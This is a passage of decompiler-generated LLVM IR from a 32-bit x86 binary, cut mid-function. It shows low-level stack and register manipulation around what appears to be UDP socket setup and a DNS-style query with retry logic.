  %v1_8050d74 = add i32 %v0_8050d71, 8
  %v2_8050d74 = inttoptr i32 %v1_8050d74 to i32*
  store i32 ptrtoint (i32* @global_var_8056450.137 to i32), i32* %v2_8050d74, align 4
  %v1_8050d79 = add i32 %v0_8050d71, 4
  %v2_8050d79 = inttoptr i32 %v1_8050d79 to i32*
  store i32 134542939, i32* %v2_8050d79, align 4
  %v1_8050d7e = add i32 %v0_8050d71, 200
  store i32 %v1_8050d7e, i32* @eax, align 4
  %v3_8050d85 = inttoptr i32 %v0_8050d71 to i32*
  store i32 %v1_8050d7e, i32* %v3_8050d85, align 4
  %v2_8050d86 = call i32 @function_804f65e(i32 -1, i32 %v15_8050ca8)
  store i32 %v2_8050d86, i32* %eax.global-to-local, align 4
  %v0_8050d8b = load i32, i32* @esp, align 4
  %v1_8050d8b = inttoptr i32 %v0_8050d8b to i32*
  store i32 ptrtoint (i32* @global_var_8056450.137 to i32), i32* %v1_8050d8b, align 4
  %v1_8050d92 = call i32 @function_804f65b(i32 -1)
  store i32 %v1_8050d92, i32* %eax.global-to-local, align 4
  %v0_8050d97 = load i32, i32* @esp, align 4
  %v1_8050d97 = add i32 %v0_8050d97, 56
  %v2_8050d97 = inttoptr i32 %v1_8050d97 to i32*
  %v3_8050d97 = load i32, i32* %v2_8050d97, align 4
  store i32 %v3_8050d97, i32* %edx.global-to-local, align 4
  %v1_8050d9b = add i32 %v0_8050d97, 268
  %v2_8050d9b = inttoptr i32 %v1_8050d9b to i32*
  %v3_8050d9b = load i32, i32* %v2_8050d9b, align 4
  store i32 %v3_8050d9b, i32* %eax.global-to-local, align 4
  %v2_8050da2 = mul i32 %v3_8050d97, 4
  %v3_8050da2 = add i32 %v3_8050d9b, %v2_8050da2
  %v4_8050da2 = inttoptr i32 %v3_8050da2 to i32*
  %v5_8050da2 = load i32, i32* %v4_8050da2, align 4
  store i32 %v5_8050da2, i32* %edx.global-to-local, align 4
  %v2_8050da5 = add i32 %v0_8050d97, 48
  %v3_8050da5 = inttoptr i32 %v2_8050da5 to i32*
  store i32 %v5_8050da2, i32* %v3_8050da5, align 4
  %v0_8050da9 = load i32, i32* @esp, align 4
  %v1_8050da9 = add i32 %v0_8050da9, 16
  %v1_8050dac = add i32 %v0_8050da9, 52
  %v2_8050dac = inttoptr i32 %v1_8050dac to i32*
  %v3_8050dac = load i32, i32* %v2_8050dac, align 4
  %v5_8050dac = icmp slt i32 %v3_8050dac, 0
  br i1 %v5_8050dac, label %dec_label_pc_8050d5b.dec_label_pc_8050df2_crit_edge, label %dec_label_pc_8050db3

dec_label_pc_8050d5b.dec_label_pc_8050df2_crit_edge: ; preds = %dec_label_pc_8050d5b
  %v0_8050df2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050df2

dec_label_pc_8050db3:                             ; preds = %dec_label_pc_8050d5b
  store i32 %v3_8050dac, i32* %eax.global-to-local, align 4
  %v1_8050db7 = load i32, i32* @global_var_8059138.197, align 8
  %v2_8050db7 = sub i32 %v3_8050dac, %v1_8050db7
  %v8_8050db7 = xor i32 %v1_8050db7, %v3_8050dac
  %v9_8050db7 = xor i32 %v2_8050db7, %v3_8050dac
  %v10_8050db7 = and i32 %v9_8050db7, %v8_8050db7
  %v11_8050db7 = icmp slt i32 %v10_8050db7, 0
  %v13_8050db7 = icmp slt i32 %v2_8050db7, 0
  %v2_8050dbd = icmp eq i1 %v13_8050db7, %v11_8050db7
  br i1 %v2_8050dbd, label %dec_label_pc_8050df2, label %dec_label_pc_8050dbf

dec_label_pc_8050dbf:                             ; preds = %dec_label_pc_8050db3
  %v2_8050dbf = add i32 %v0_8050da9, 12
  %v3_8050dbf = inttoptr i32 %v2_8050dbf to i32*
  store i32 %v3_8050dac, i32* %v3_8050dbf, align 4
  %v1_8050dc0 = add i32 %v0_8050da9, 8
  %v2_8050dc0 = inttoptr i32 %v1_8050dc0 to i32*
  store i32 1025, i32* %v2_8050dc0, align 4
  %v1_8050dc5 = add i32 %v0_8050da9, 4
  %v2_8050dc5 = inttoptr i32 %v1_8050dc5 to i32*
  store i32 ptrtoint (i32* @global_var_805501c.198 to i32), i32* %v2_8050dc5, align 4
  %v1_8050dca = add i32 %v0_8050da9, 28
  %v2_8050dca = inttoptr i32 %v1_8050dca to i32*
  %v3_8050dca = load i32, i32* %v2_8050dca, align 4
  %v6_8050dca = inttoptr i32 %v0_8050da9 to i32*
  store i32 %v3_8050dca, i32* %v6_8050dca, align 4
  %v0_8050dce = call i32 @function_80519f8()
  store i32 %v0_8050dce, i32* %eax.global-to-local, align 4
  %v0_8050dd3 = load i32, i32* @esp, align 4
  %v1_8050dd6 = add i32 %v0_8050dd3, 8
  %v2_8050dd6 = inttoptr i32 %v1_8050dd6 to i32*
  store i32 1025, i32* %v2_8050dd6, align 4
  %v1_8050ddb = add i32 %v0_8050dd3, 52
  %v2_8050ddb = inttoptr i32 %v1_8050ddb to i32*
  %v3_8050ddb = load i32, i32* %v2_8050ddb, align 4
  store i32 %v3_8050ddb, i32* %edx.global-to-local, align 4
  %v1_8050ddf = mul i32 %v3_8050ddb, 4
  %v2_8050ddf = add i32 %v1_8050ddf, 134582552
  %v3_8050ddf = inttoptr i32 %v2_8050ddf to i32*
  %v4_8050ddf = load i32, i32* %v3_8050ddf, align 4
  %v6_8050ddf = add i32 %v0_8050dd3, 4
  %v7_8050ddf = inttoptr i32 %v6_8050ddf to i32*
  store i32 %v4_8050ddf, i32* %v7_8050ddf, align 4
  %v1_8050de6 = add i32 %v0_8050dd3, 28
  %v2_8050de6 = inttoptr i32 %v1_8050de6 to i32*
  %v3_8050de6 = load i32, i32* %v2_8050de6, align 4
  %v6_8050de6 = inttoptr i32 %v0_8050dd3 to i32*
  store i32 %v3_8050de6, i32* %v6_8050de6, align 4
  %v0_8050dea = call i32 @function_80519f8()
  store i32 %v0_8050dea, i32* %eax.global-to-local, align 4
  %v0_8050def = load i32, i32* @esp, align 4
  %v1_8050def = add i32 %v0_8050def, 16
  br label %dec_label_pc_8050df2

dec_label_pc_8050df2:                             ; preds = %dec_label_pc_8050d5b.dec_label_pc_8050df2_crit_edge, %dec_label_pc_8050db3, %dec_label_pc_8050dbf
  %v1_8050df2 = phi i32 [ %v1_8050da9, %dec_label_pc_8050d5b.dec_label_pc_8050df2_crit_edge ], [ %v1_8050da9, %dec_label_pc_8050db3 ], [ %v1_8050def, %dec_label_pc_8050dbf ]
  %v0_8050df2 = phi i32 [ %v0_8050df2.pre, %dec_label_pc_8050d5b.dec_label_pc_8050df2_crit_edge ], [ %v3_8050dac, %dec_label_pc_8050db3 ], [ %v0_8050dea, %dec_label_pc_8050dbf ]
  %v2_8050df2 = add i32 %v1_8050df2, -4
  %v3_8050df2 = inttoptr i32 %v2_8050df2 to i32*
  store i32 %v0_8050df2, i32* %v3_8050df2, align 4
  %v0_8050df3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050df3 = add i32 %v1_8050df2, -8
  %v3_8050df3 = inttoptr i32 %v2_8050df3 to i32*
  store i32 %v0_8050df3, i32* %v3_8050df3, align 4
  %v1_8050df4 = add i32 %v1_8050df2, -12
  %v2_8050df4 = inttoptr i32 %v1_8050df4 to i32*
  store i32 1, i32* %v2_8050df4, align 4
  %v1_8050df6 = add i32 %v1_8050df2, 184
  store i32 %v1_8050df6, i32* @eax, align 4
  %v2_8050dfd = add i32 %v1_8050df2, -16
  %v3_8050dfd = inttoptr i32 %v2_8050dfd to i32*
  store i32 %v1_8050df6, i32* %v3_8050dfd, align 4
  %v2_8050dfe = call i32 @function_804f65e(i32 -1, i32 %v15_8050ca8)
  store i32 %v2_8050dfe, i32* %eax.global-to-local, align 4
  %v0_8050e03 = load i32, i32* @esp, align 4
  %v1_8050e03 = add i32 %v0_8050e03, 28
  %v2_8050e03 = inttoptr i32 %v1_8050e03 to i32*
  %v3_8050e03 = load i32, i32* %v2_8050e03, align 4
  store i32 %v3_8050e03, i32* %eax.global-to-local, align 4
  %v1_8050e07 = add i32 %v0_8050e03, 260
  %v2_8050e07 = inttoptr i32 %v1_8050e07 to i32*
  %v3_8050e07 = load i32, i32* %v2_8050e07, align 4
  store i32 %v3_8050e07, i32* @edx, align 4
  %v1_8050e0e = add i32 %v0_8050e03, 224
  %v2_8050e0e = inttoptr i32 %v1_8050e0e to i32*
  store i32 1, i32* %v2_8050e0e, align 4
  %v0_8050e19 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e19 = load i32, i32* @esp, align 4
  %v2_8050e19 = add i32 %v1_8050e19, 216
  %v3_8050e19 = inttoptr i32 %v2_8050e19 to i32*
  store i32 %v0_8050e19, i32* %v3_8050e19, align 4
  %v1_8050e25 = load i32, i32* @ebx, align 4
  %v2_8050e25 = sub i32 512, %v1_8050e25
  store i32 %v2_8050e25, i32* %eax.global-to-local, align 4
  %v0_8050e27 = load i32, i32* @edx, align 4
  %v1_8050e27 = load i32, i32* @esp, align 4
  %v2_8050e27 = add i32 %v1_8050e27, 220
  %v3_8050e27 = inttoptr i32 %v2_8050e27 to i32*
  store i32 %v0_8050e27, i32* %v3_8050e27, align 4
  %v0_8050e2e = load i32, i32* @esp, align 4
  %v0_8050e31 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e31 = add i32 %v0_8050e2e, 8
  %v3_8050e31 = inttoptr i32 %v2_8050e31 to i32*
  store i32 %v0_8050e31, i32* %v3_8050e31, align 4
  %v1_8050e32 = load i32, i32* @ebx, align 4
  %v2_8050e32 = add i32 %v1_8050e32, %v1_8050c1a
  %v2_8050e36 = add i32 %v0_8050e2e, 4
  %v3_8050e36 = inttoptr i32 %v2_8050e36 to i32*
  store i32 %v2_8050e32, i32* %v3_8050e36, align 4
  %v1_8050e37 = add i32 %v0_8050e2e, 216
  store i32 %v1_8050e37, i32* @eax, align 4
  %v3_8050e3e = inttoptr i32 %v0_8050e2e to i32*
  store i32 %v1_8050e37, i32* %v3_8050e3e, align 4
  %v0_8050e3f = call i32 @function_8052150()
  store i32 %v0_8050e3f, i32* %eax.global-to-local, align 4
  %v0_8050e44 = load i32, i32* @esp, align 4
  %v2_8050e47 = icmp slt i32 %v0_8050e3f, 0
  store i32 %v0_8050e3f, i32* @esi, align 4
  br i1 %v2_8050e47, label %dec_label_pc_80512ad, label %dec_label_pc_8050e51

dec_label_pc_8050e51:                             ; preds = %dec_label_pc_8050df2
  %v1_8050e51 = add i32 %v0_8050e44, 172
  %v2_8050e51 = inttoptr i32 %v1_8050e51 to i16*
  store i16 2, i16* %v2_8050e51, align 2
  %v1_8050e5b = load i32, i32* @esp, align 4
  %v2_8050e5b = add i32 %v1_8050e5b, -4
  %v3_8050e5b = inttoptr i32 %v2_8050e5b to i32*
  store i32 %v0_8050e3f, i32* %v3_8050e5b, align 4
  %v1_8050e5c = add i32 %v1_8050e5b, 164
  store i32 %v1_8050e5c, i32* %eax.global-to-local, align 4
  %v2_8050e63 = add i32 %v1_8050e5b, -8
  %v3_8050e63 = inttoptr i32 %v2_8050e63 to i32*
  store i32 %v1_8050e5c, i32* %v3_8050e63, align 4
  %v1_8050e64 = add i32 %v1_8050e5b, 32
  %v2_8050e64 = inttoptr i32 %v1_8050e64 to i32*
  %v3_8050e64 = load i32, i32* %v2_8050e64, align 4
  %v5_8050e64 = add i32 %v1_8050e5b, -12
  %v6_8050e64 = inttoptr i32 %v5_8050e64 to i32*
  store i32 %v3_8050e64, i32* %v6_8050e64, align 4
  %v1_8050e68 = add i32 %v1_8050e5b, -16
  %v2_8050e68 = inttoptr i32 %v1_8050e68 to i32*
  store i32 10, i32* %v2_8050e68, align 4
  %v5_8050e6a = call i32 @function_8051b46(i32 -1, i8* %v4_8050e6a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8050e6a, i32* %eax.global-to-local, align 4
  %v0_8050e6f = load i32, i32* @esp, align 4
  %v1_8050e6f = add i32 %v0_8050e6f, 16
  %tmp46 = icmp slt i32 %v5_8050e6a, 1
  br i1 %tmp46, label %dec_label_pc_8050e80, label %dec_label_pc_8050e76

dec_label_pc_8050e76:                             ; preds = %dec_label_pc_8050e51
  %v1_8050e76 = add i32 %v0_8050e6f, 172
  %v2_8050e76 = inttoptr i32 %v1_8050e76 to i16*
  store i16 10, i16* %v2_8050e76, align 2
  %v0_8050e80.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050e80

dec_label_pc_8050e80:                             ; preds = %dec_label_pc_8050e51, %dec_label_pc_8050e76
  %v0_8050e97 = phi i32 [ %v1_8050e6f, %dec_label_pc_8050e51 ], [ %v0_8050e80.pre, %dec_label_pc_8050e76 ]
  %v1_8050e80 = add i32 %v0_8050e97, 156
  %v2_8050e80 = inttoptr i32 %v1_8050e80 to i16*
  %v3_8050e80 = load i16, i16* %v2_8050e80, align 2
  %v12_8050e80 = icmp eq i16 %v3_8050e80, 10
  %v1_8050e89 = icmp eq i1 %v12_8050e80, false
  %v1_8050e97 = add i32 %v0_8050e97, 158
  %v2_8050e97 = inttoptr i32 %v1_8050e97 to i16*
  store i16 13568, i16* %v2_8050e97, align 2
  %v0_8050ea1 = load i32, i32* @esp, align 4
  br i1 %v1_8050e89, label %dec_label_pc_8050e97, label %dec_label_pc_8050eb7

dec_label_pc_8050e97:                             ; preds = %dec_label_pc_8050e80
  %v1_8050ea4 = add i32 %v0_8050ea1, 32
  %v2_8050ea4 = inttoptr i32 %v1_8050ea4 to i32*
  %v3_8050ea4 = load i32, i32* %v2_8050ea4, align 4
  %v5_8050ea4 = add i32 %v0_8050ea1, -16
  %v6_8050ea4 = inttoptr i32 %v5_8050ea4 to i32*
  store i32 %v3_8050ea4, i32* %v6_8050ea4, align 4
  %v1_8050ea8 = call i32 @function_804d880(i32 -1)
  store i32 %v1_8050ea8, i32* %eax.global-to-local, align 4
  %v1_8050ead = load i32, i32* @esp, align 4
  %v2_8050ead = add i32 %v1_8050ead, 176
  %v3_8050ead = inttoptr i32 %v2_8050ead to i32*
  store i32 %v1_8050ea8, i32* %v3_8050ead, align 4
  %v0_8050eb4 = load i32, i32* @esp, align 4
  %v1_8050eb4 = add i32 %v0_8050eb4, 16
  br label %dec_label_pc_8050eb7

dec_label_pc_8050eb7:                             ; preds = %dec_label_pc_8050e80, %dec_label_pc_8050e97
  %v1_8050eb7 = phi i32 [ %v1_8050eb4, %dec_label_pc_8050e97 ], [ %v0_8050ea1, %dec_label_pc_8050e80 ]
  %v0_8050eb7 = load i32, i32* @ecx, align 4
  %v2_8050eb7 = add i32 %v1_8050eb7, -4
  %v3_8050eb7 = inttoptr i32 %v2_8050eb7 to i32*
  store i32 %v0_8050eb7, i32* %v3_8050eb7, align 4
  %v1_8050eb8 = add i32 %v1_8050eb7, -8
  %v2_8050eb8 = inttoptr i32 %v1_8050eb8 to i32*
  store i32 17, i32* %v2_8050eb8, align 4
  %v1_8050eba = add i32 %v1_8050eb7, -12
  %v2_8050eba = inttoptr i32 %v1_8050eba to i32*
  store i32 2, i32* %v2_8050eba, align 4
  %v1_8050ebc = add i32 %v1_8050eb7, 156
  %v2_8050ebc = inttoptr i32 %v1_8050ebc to i16*
  %v3_8050ebc = load i16, i16* %v2_8050ebc, align 2
  %v4_8050ebc = zext i16 %v3_8050ebc to i32
  store i32 %v4_8050ebc, i32* %eax.global-to-local, align 4
  %v2_8050ec4 = add i32 %v1_8050eb7, -16
  %v3_8050ec4 = inttoptr i32 %v2_8050ec4 to i32*
  store i32 %v4_8050ebc, i32* %v3_8050ec4, align 4
  %v3_8050ec5 = call i32 @function_804dd68(i32 -1, i32 %v15_8050ca8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050ec5, i32* %eax.global-to-local, align 4
  %v1_8050eca = load i32, i32* @esp, align 4
  %v2_8050eca = add i32 %v1_8050eca, 36
  %v3_8050eca = inttoptr i32 %v2_8050eca to i32*
  store i32 %v3_8050ec5, i32* %v3_8050eca, align 4
  %v0_8050ece = load i32, i32* @esp, align 4
  %v1_8050ece = add i32 %v0_8050ece, 16
  %v0_8050ed1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ed1 = icmp slt i32 %v0_8050ed1, 0
  br i1 %v2_8050ed1, label %dec_label_pc_8050efe, label %dec_label_pc_8050ed5

dec_label_pc_8050ed5:                             ; preds = %dec_label_pc_8050eb7
  %v1_8050ed5 = add i32 %v0_8050ece, 172
  store i32 %v1_8050ed5, i32* %eax.global-to-local, align 4
  %v0_8050edc = load i32, i32* @edx, align 4
  %v2_8050edc = add i32 %v0_8050ece, 12
  %v3_8050edc = inttoptr i32 %v2_8050edc to i32*
  store i32 %v0_8050edc, i32* %v3_8050edc, align 4
  %v1_8050edd = add i32 %v0_8050ece, 8
  %v2_8050edd = inttoptr i32 %v1_8050edd to i32*
  store i32 28, i32* %v2_8050edd, align 4
  %v0_8050edf = load i32, i32* %eax.global-to-local, align 4
  %v2_8050edf = add i32 %v0_8050ece, 4
  %v3_8050edf = inttoptr i32 %v2_8050edf to i32*
  store i32 %v0_8050edf, i32* %v3_8050edf, align 4
  %v1_8050ee0 = add i32 %v0_8050ece, 36
  %v2_8050ee0 = inttoptr i32 %v1_8050ee0 to i32*
  %v3_8050ee0 = load i32, i32* %v2_8050ee0, align 4
  %v6_8050ee0 = inttoptr i32 %v0_8050ece to i32*
  store i32 %v3_8050ee0, i32* %v6_8050ee0, align 4
  %v3_8050ee4 = call i32 @function_804dc64(i32 -1, i32 %v15_8050ca8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050ee4, i32* %eax.global-to-local, align 4
  %v0_8050ee9 = load i32, i32* @esp, align 4
  %v2_8050eec = icmp slt i32 %v3_8050ee4, 0
  %v1_8050eee = icmp eq i1 %v2_8050eec, false
  br i1 %v1_8050eee, label %dec_label_pc_8050f07, label %dec_label_pc_8050ef0

dec_label_pc_8050ef0:                             ; preds = %dec_label_pc_8050ed5
  %v1_8050ef0 = call i32 @function_804baa4(i32 -1)
  store i32 %v1_8050ef0, i32* %eax.global-to-local, align 4
  %v1_8050ef5 = inttoptr i32 %v1_8050ef0 to i32*
  %v2_8050ef5 = load i32, i32* %v1_8050ef5, align 4
  %v11_8050ef5 = icmp eq i32 %v2_8050ef5, 101
  %v0_8051267.pre = load i32, i32* @esp, align 4
  br i1 %v11_8050ef5, label %dec_label_pc_8051267, label %dec_label_pc_8050efe

dec_label_pc_8050efe:                             ; preds = %dec_label_pc_8050ef0, %dec_label_pc_8050eb7
  %v17_8050efe = phi i32 [ %v1_8050ece, %dec_label_pc_8050eb7 ], [ %v0_8051267.pre, %dec_label_pc_8050ef0 ]
  %v1_8050efe = add i32 %v17_8050efe, 28
  %v2_8050efe = inttoptr i32 %v1_8050efe to i32*
  %v3_8050efe = load i32, i32* %v2_8050efe, align 4
  %v4_8050efe = add i32 %v3_8050efe, 1
  store i32 %v4_8050efe, i32* %v2_8050efe, align 4
  br label %dec_label_pc_8051288.backedge

dec_label_pc_8050f07:                             ; preds = %dec_label_pc_8050ed5
  %v1_8050f07 = add i32 %v0_8050ee9, 12
  %v2_8050f07 = inttoptr i32 %v1_8050f07 to i32*
  store i32 0, i32* %v2_8050f07, align 4
  %v0_8050f09 = load i32, i32* @ebx, align 4
  %v1_8050f09 = load i32, i32* @esi, align 4
  %v2_8050f09 = add i32 %v1_8050f09, %v0_8050f09
  store i32 %v2_8050f09, i32* %eax.global-to-local, align 4
  %v2_8050f0c = add i32 %v0_8050ee9, 8
  %v3_8050f0c = inttoptr i32 %v2_8050f0c to i32*
  store i32 %v2_8050f09, i32* %v3_8050f0c, align 4
  %v2_8050f0d = add i32 %v0_8050ee9, 4
  %v3_8050f0d = inttoptr i32 %v2_8050f0d to i32*
  store i32 %v1_8050c1a, i32* %v3_8050f0d, align 4
  %v1_8050f0e = add i32 %v0_8050ee9, 36
  %v2_8050f0e = inttoptr i32 %v1_8050f0e to i32*
  %v3_8050f0e = load i32, i32* %v2_8050f0e, align 4
  %v6_8050f0e = inttoptr i32 %v0_8050ee9 to i32*
  store i32 %v3_8050f0e, i32* %v6_8050f0e, align 4
  %v0_8050f12 = call i32 @function_80515c8()
  store i32 %v0_8050f12, i32* %eax.global-to-local, align 4
  %v0_8050f17 = load i32, i32* @esp, align 4
  %v1_8050f17 = add i32 %v0_8050f17, 36
  %v2_8050f17 = inttoptr i32 %v1_8050f17 to i32*
  %v3_8050f17 = load i32, i32* %v2_8050f17, align 4
  store i32 %v3_8050f17, i32* %eax.global-to-local, align 4
  %v1_8050f1b = add i32 %v0_8050f17, 232
  %v2_8050f1b = inttoptr i32 %v1_8050f1b to i16*
  store i16 1, i16* %v2_8050f1b, align 2
  %v0_8050f25 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f25 = load i32, i32* @esp, align 4
  %v2_8050f25 = add i32 %v1_8050f25, 228
  %v3_8050f25 = inttoptr i32 %v2_8050f25 to i32*
  store i32 %v0_8050f25, i32* %v3_8050f25, align 4
  %v0_8050f2c = load i32, i32* @esp, align 4
  %v1_8050f2f = add i32 %v0_8050f2c, 8
  %v2_8050f2f = inttoptr i32 %v1_8050f2f to i32*
  store i32 10000, i32* %v2_8050f2f, align 4
  %v1_8050f34 = add i32 %v0_8050f2c, 4
  %v2_8050f34 = inttoptr i32 %v1_8050f34 to i32*
  store i32 1, i32* %v2_8050f34, align 4
  %v1_8050f36 = add i32 %v0_8050f2c, 228
  store i32 %v1_8050f36, i32* %eax.global-to-local, align 4
  %v3_8050f3d = inttoptr i32 %v0_8050f2c to i32*
  store i32 %v1_8050f36, i32* %v3_8050f3d, align 4
  %v0_8050f3e = call i32 @function_80516dc()
  store i32 %v0_8050f3e, i32* %eax.global-to-local, align 4
  %v0_8050f43 = load i32, i32* @esp, align 4
  %v1_8050f43 = add i32 %v0_8050f43, 16
  %tmp47 = icmp slt i32 %v0_8050f3e, 1
  br i1 %tmp47, label %dec_label_pc_8051267, label %dec_label_pc_8050f4e

dec_label_pc_8050f4e:                             ; preds = %dec_label_pc_8050f07
  %v1_8050f4e = add i32 %v0_8050f43, 12
  %v2_8050f4e = inttoptr i32 %v1_8050f4e to i32*
  store i32 0, i32* %v2_8050f4e, align 4
  %v1_8050f50 = add i32 %v0_8050f43, 8
  %v2_8050f50 = inttoptr i32 %v1_8050f50 to i32*
  store i32 512, i32* %v2_8050f50, align 4
  %v2_8050f55 = add i32 %v0_8050f43, 4
  %v3_8050f55 = inttoptr i32 %v2_8050f55 to i32*
  store i32 %v1_8050c1a, i32* %v3_8050f55, align 4
  %v1_8050f56 = add i32 %v0_8050f43, 36
  %v2_8050f56 = inttoptr i32 %v1_8050f56 to i32*
  %v3_8050f56 = load i32, i32* %v2_8050f56, align 4
  %v6_8050f56 = inttoptr i32 %v0_8050f43 to i32*
  store i32 %v3_8050f56, i32* %v6_8050f56, align 4
  %v4_8050f5a = call i32 @function_804dcb4(i32 -1, i32 %v15_8050ca8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050f5a, i32* @eax, align 4
  %v1_8050f5f = load i32, i32* @esp, align 4
  %v2_8050f5f = add i32 %v1_8050f5f, 32
  %v3_8050f5f = inttoptr i32 %v2_8050f5f to i32*
  store i32 %v4_8050f5a, i32* %v3_8050f5f, align 4
  %v0_8050f63 = load i32, i32* @esp, align 4
  %v1_8050f63 = add i32 %v0_8050f63, 16
  %v7_8050f69 = icmp sgt i32 %v4_8050f5a, 11
  br i1 %v7_8050f69, label %dec_label_pc_8050f6f, label %dec_label_pc_805121c

dec_label_pc_8050f6f:                             ; preds = %dec_label_pc_8050f4e
  %v0_8050f6f = load i32, i32* @ebx, align 4
  %v2_8050f6f = add i32 %v0_8050f63, 12
  %v3_8050f6f = inttoptr i32 %v2_8050f6f to i32*
  store i32 %v0_8050f6f, i32* %v3_8050f6f, align 4
  %v0_8050f70 = load i32, i32* @ebx, align 4
  %v2_8050f70 = add i32 %v0_8050f63, 8
  %v3_8050f70 = inttoptr i32 %v2_8050f70 to i32*
  store i32 %v0_8050f70, i32* %v3_8050f70, align 4
  %v1_8050f71 = add i32 %v0_8050f63, 84
  store i32 %v1_8050f71, i32* %eax.global-to-local, align 4
  %v2_8050f75 = add i32 %v0_8050f63, 4
  %v3_8050f75 = inttoptr i32 %v2_8050f75 to i32*
  store i32 %v1_8050f71, i32* %v3_8050f75, align 4
  %v3_8050f76 = inttoptr i32 %v0_8050f63 to i32*
  store i32 %v1_8050c1a, i32* %v3_8050f76, align 4
  %v0_8050f77 = call i32 @function_80520a4()
  store i32 %v0_8050f77, i32* %eax.global-to-local, align 4
  %v0_8050f7c = load i32, i32* @esp, align 4
  %v1_8050f7c = add i32 %v0_8050f7c, 84
  %v2_8050f7c = inttoptr i32 %v1_8050f7c to i32*
  %v3_8050f7c = load i32, i32* %v2_8050f7c, align 4
  store i32 %v3_8050f7c, i32* %edx.global-to-local, align 4
  %v2_8050f80 = add i32 %v0_8050f7c, 60
  %v3_8050f80 = inttoptr i32 %v2_8050f80 to i32*
  store i32 %v3_8050f7c, i32* %v3_8050f80, align 4
  %v0_8050f84 = load i32, i32* @esp, align 4
  %v1_8050f84 = add i32 %v0_8050f84, 16
  %v1_8050f87 = add i32 %v0_8050f84, 72
  %v2_8050f87 = inttoptr i32 %v1_8050f87 to i32*
  %v3_8050f87 = load i32, i32* %v2_8050f87, align 4
  store i32 %v3_8050f87, i32* @eax, align 4
  %v0_8050f8b = load i32, i32* %edx.global-to-local, align 4
  %v12_8050f8b = icmp eq i32 %v0_8050f8b, %v3_8050f87
  %v1_8050f8d = icmp eq i1 %v12_8050f8b, false
  br i1 %v1_8050f8d, label %dec_label_pc_805121c, label %dec_label_pc_8050f93

dec_label_pc_8050f93:                             ; preds = %dec_label_pc_8050f6f
  %v1_8050f93 = add i32 %v0_8050f84, 88
  %v2_8050f93 = inttoptr i32 %v1_8050f93 to i32*
  %v3_8050f93 = load i32, i32* %v2_8050f93, align 4
  %v4_8050f93 = icmp eq i32 %v3_8050f93, 0
  br i1 %v4_8050f93, label %dec_label_pc_805121c, label %dec_label_pc_8050f9e

dec_label_pc_8050f9e:                             ; preds = %dec_label_pc_8050f93
  %v1_8050f9e = add i32 %v0_8050f84, 112
  %v2_8050f9e = inttoptr i32 %v1_8050f9e to i32*
  %v3_8050f9e = load i32, i32* %v2_8050f9e, align 4
  store i32 %v3_8050f9e, i32* @eax, align 4
  %v9_8050fa2 = icmp eq i32 %v3_8050f9e, 3
  %v1_8050fa5 = icmp eq i1 %v9_8050fa2, false
  br i1 %v1_8050fa5, label %dec_label_pc_805100d, label %dec_label_pc_8050fa7

dec_label_pc_8050fa7:                             ; preds = %dec_label_pc_8050f9e
  %v1_8050fa7 = add i32 %v0_8050f84, 67
  %v2_8050fa7 = inttoptr i32 %v1_8050fa7 to i8*
  %v3_8050fa7 = load i8, i8* %v2_8050fa7, align 1
  %v4_8050fa7 = icmp eq i8 %v3_8050fa7, 0
  %v1_8050fac = icmp eq i1 %v4_8050fa7, false
  br i1 %v1_8050fac, label %dec_label_pc_8050ffd, label %dec_label_pc_8050fae

dec_label_pc_8050fae:                             ; preds = %dec_label_pc_8050fa7
  %v0_8050fae = load i32, i32* @ecx, align 4
  %v2_8050fae = add i32 %v0_8050f84, 12
  %v3_8050fae = inttoptr i32 %v2_8050fae to i32*
  store i32 %v0_8050fae, i32* %v3_8050fae, align 4
  %v1_8050faf = add i32 %v0_8050f84, 8
  %v2_8050faf = inttoptr i32 %v1_8050faf to i32*
  store i32 ptrtoint (i32* @global_var_8056450.137 to i32), i32* %v2_8050faf, align 4
  %v1_8050fb4 = add i32 %v0_8050f84, 4
  %v2_8050fb4 = inttoptr i32 %v1_8050fb4 to i32*
  store i32 134542939, i32* %v2_8050fb4, align 4
  %v1_8050fb9 = add i32 %v0_8050f84, 200
  store i32 %v1_8050fb9, i32* @esi, align 4
  %v3_8050fc0 = inttoptr i32 %v0_8050f84 to i32*
  store i32 %v1_8050fb9, i32* %v3_8050fc0, align 4
  %v2_8050fc1 = call i32 @function_804f65e(i32 -1, i32 %v15_8050ca8)
  store i32 %v2_8050fc1, i32* %eax.global-to-local, align 4
  %v0_8050fc6 = load i32, i32* @esp, align 4
  %v1_8050fc6 = inttoptr i32 %v0_8050fc6 to i32*
  store i32 ptrtoint (i32* @global_var_8056450.137 to i32), i32* %v1_8050fc6, align 4
  %v1_8050fcd = call i32 @function_804f65b(i32 -1)
  store i32 %v1_8050fcd, i32* %eax.global-to-local, align 4
  %v0_8050fd2 = load i32, i32* @global_var_8059138.197, align 8
  store i32 %v0_8050fd2, i32* %ebx.global-to-local, align 4
  %v0_8050fd8 = load i32, i32* @esp, align 4
  %v1_8050fd8 = inttoptr i32 %v0_8050fd8 to i32*
  %v2_8050fd8 = load i32, i32* %v1_8050fd8, align 4
  store i32 %v2_8050fd8, i32* @eax, align 4
  %v3_8050fd8 = add i32 %v0_8050fd8, 4
  %v1_8050fd9 = inttoptr i32 %v3_8050fd8 to i32*
  %v2_8050fd9 = load i32, i32* %v1_8050fd9, align 4
  store i32 %v2_8050fd9, i32* %edx.global-to-local, align 4
  %v1_8050fda = add i32 %v0_8050fd2, -1
  store i32 %v1_8050fda, i32* @ebx, align 4
  store i32 1, i32* %v1_8050fd9, align 4
  %v0_8050fdd = load i32, i32* @esi, align 4
  store i32 %v0_8050fdd, i32* %v1_8050fd8, align 4
  %v2_8050fde = call i32 @function_804f65e(i32 -1, i32 %v15_8050ca8)
  store i32 %v2_8050fde, i32* %eax.global-to-local, align 4
  %v0_8050fe3 = load i32, i32* @esp, align 4
  %v1_8050fe6 = add i32 %v0_8050fe3, 52
  %v2_8050fe6 = inttoptr i32 %v1_8050fe6 to i32*
